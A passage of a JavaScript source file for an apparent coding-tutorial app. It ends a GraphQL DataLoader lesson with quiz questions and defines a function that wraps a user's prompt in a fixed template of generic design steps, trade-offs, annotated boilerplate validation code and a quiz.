      after: `// DataLoader Pattern: 1 batched query
Post: {
  author: (post, _, { loaders }) => {
    // 50 posts = 1 query: WHERE id IN ($1, $2, ...)
    return loaders.authorLoader.load(post.authorId);
  }
}`
    },

    quiz: [
      {
        question: "In a GraphQL query requesting 20 blog posts and their authors, a naive resolver architecture executes 21 database queries (1 query for posts + 20 individual queries for authors). How does the DataLoader pattern collapse these into 2 queries?",
        options: [
          "DataLoader compiles the GraphQL schema into a single C++ binary",
          "DataLoader queues individual `load(id)` calls made across field resolvers during a single event loop tick, then dispatches one consolidated query with all IDs using `WHERE id IN (...)`",
          "DataLoader prevents the client from requesting nested fields",
          "DataLoader stores all database records in the browser's localStorage"
        ],
        correctIndex: 1,
        explanation: "DataLoader leverages the JavaScript microtask queue: each resolver calls `loader.load(id)`, which buffers the ID. On the next tick, DataLoader fires the batch function once with all collected IDs, reducing N round-trips to 1."
      },
      {
        question: "Why must a DataLoader batch loading function always return an array of results with the exact same length and order as the input keys array?",
        options: [
          "DataLoader maps each returned promise to the result array positionally by index (`results[i]`); if lengths or orders mismatch, items receive the wrong data or promises never resolve",
          "The SQL standard requires all database drivers to return rows in alphabetical order",
          "JavaScript arrays throw an unhandled TypeError if elements are reordered",
          "GraphQL schemas reject arrays that contain more than 10 elements"
        ],
        correctIndex: 0,
        explanation: "DataLoader resolves the promise for `keys[i]` using the value at `results[i]`. If the database returns results in a different order or omits missing items, DataLoader pairs the wrong data with the wrong calling resolvers."
      }
    ]
  }
];


export function generateCustomScenario(userPrompt) {
  return {
    id: "custom-" + Date.now(),
    title: `Analysis: "${userPrompt.slice(0, 45)}${userPrompt.length > 45 ? '...' : ''}"`,
    category: "Custom Problem Breakdown",
    difficulty: "Adaptive",
    prompt: userPrompt,

    intentBreakdown: [
      {
        step: 1,
        title: "Problem & Architecture Mapping",
        details: `Deconstructing query requirement: "${userPrompt}". Isolating key components, data flow requirements, and non-functional targets.`
      },
      {
        step: 2,
        title: "Modular Decomposition & Edge Cases",
        details: "Determining clean state isolation, performance constraints, error boundary handling, and maintainable modular boundaries."
      },
      {
        step: 3,
        title: "Synthesizing Metacognitive Solution",
        details: "Formulating annotated solution code with explicit architectural rationales for key design decisions."
      }
    ],

    tradeoffs: [
      {
        approach: "Option A: Declarative & Functional Component Pattern",
        pros: ["Predictable state flow", "Easier testability", "High reusability"],
        cons: ["Requires initial boilerplate setup"],
        recommended: true
      },
      {
        approach: "Option B: Imperative Direct Mutation",
        pros: ["Quick script prototype"],
        cons: ["Hard to trace state bugs", "Prone to race conditions"],
        recommended: false
      }
    ],

    code: `/**
 * Metacognitive Solution for:
 * "\${userPrompt}"
 */

export function solutionHandler(inputData) {
  // Line 8: Validate input boundaries early
  if (!inputData) {
    throw new Error("Invalid Input: Data payload must be provided.");
  }

  try {
    // Line 14: Process data with immutable transformation
    const transformed = Object.freeze({
      ...inputData,
      processedAt: new Date().toISOString(),
      version: 1.0
    });

    // Line 21: Execute core algorithm cleanly
    console.log("Executing metacognitive processing:", transformed);
    return { success: true, result: transformed };
  } catch (err) {
    // Line 25: Contextual error trapping
    console.error("Handler Failure:", err.message);
    return { success: false, error: err.message };
  }
}`,

    whyAnnotations: {
      8: {
        title: "Why Defensive Boundary Validation?",
        badge: "Fail-Fast Guard",
        type: "safety",
        summary: "Validates contract assumptions before executing expensive internal logic.",
        rationale: "Failing early prevents cryptic downstream runtime errors deep within processing pipelines."
      },
      14: {
        title: "Why Object.freeze for Immutability?",
        badge: "Immutable State",
        type: "pattern",
        summary: "Prevents accidental side-effect mutations across application modules.",
        rationale: "Immutable structures make state transitions deterministic, preventing subtle multi-threaded or reactive state bugs."
      },
      25: {
        title: "Why Structured Error Objects?",
        badge: "Resilient API Design",
        type: "safety",
        summary: "Returns predictable success/failure status objects instead of unhandled exceptions.",
        rationale: "Structured response payloads allow callers to handle errors gracefully without unhandled exception crashes."
      }
    },

    simulatorCode: `// Live Execution for Custom Prompt Solution
const testPayload = { topic: "\${userPrompt.slice(0, 30)}", priority: "High" };

console.log("🚀 Executing Generated Solution Handler...");
const output = solutionHandler(testPayload);
console.log("✨ Final Output Result:", JSON.stringify(output, null, 2));
`,

    breakpointChallenge: {
      description: "MICRO-CHALLENGE: Add schema validation for mandatory fields in \`inputData\` before calling Object.freeze!",
      buggyCode: `// Add validation logic here...`,
      solutionHint: "Check \`if (!inputData.topic)\` and return early with error details."
    },

    diffView: {
      before: `// Basic Implementation
function handle(data) {
  return { ...data, time: Date.now() };
}`,
      after: `// Metacognitive Robust Implementation
function handle(data) {
  if (!data) throw new Error("Validation Error");
  return Object.freeze({ ...data, time: new Date().toISOString() });
}`
    },

    quiz: [
      {
        question: "Why is early input validation (fail-fast design) a recommended architectural practice?",
        options: [
          "It reduces bundle size by 50%",
          "It catches invalid inputs at system boundaries before corrupting application state or downstream data stores",
          "It automatically compiles JavaScript to WebAssembly",
          "It disables browser garbage collection"
        ],
        correctIndex: 1,
        explanation: "Validating input early prevents garbage data from propagating into internal state or databases where bugs become exponentially harder to isolate."
      }
    ]
  };
}
